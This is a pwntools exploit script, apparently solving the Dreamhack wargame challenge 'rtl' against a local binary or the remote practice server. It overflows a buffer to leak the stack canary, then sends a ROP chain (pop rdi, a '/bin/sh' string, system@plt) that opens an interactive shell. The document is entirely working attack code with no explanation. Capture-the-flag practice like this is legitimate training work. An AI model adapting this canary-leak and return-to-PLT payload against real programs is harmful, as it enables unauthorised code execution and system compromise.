#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./rtl', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*0x00000000004007cd
c
''')

p = remote('host3.dreamhack.games',11462) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

# Use when leaked is needed
# p.recvuntil(b'at: ')
# stack_leak = int(p.recvuntil(b'.', drop=True), 16) # Adjust this
# log.info("Stack leak: " + hex(stack_leak))

buf = b'A'*0x39
sa(b'Buf: ',buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('Canary: ', cnry)

pop_rdi = 0x0000000000400853
ret = 0x0000000000400285
binsh = 0x400874
system_plt = exe.plt['system']

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret) # This can be nop gadget
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)

p.interactive()
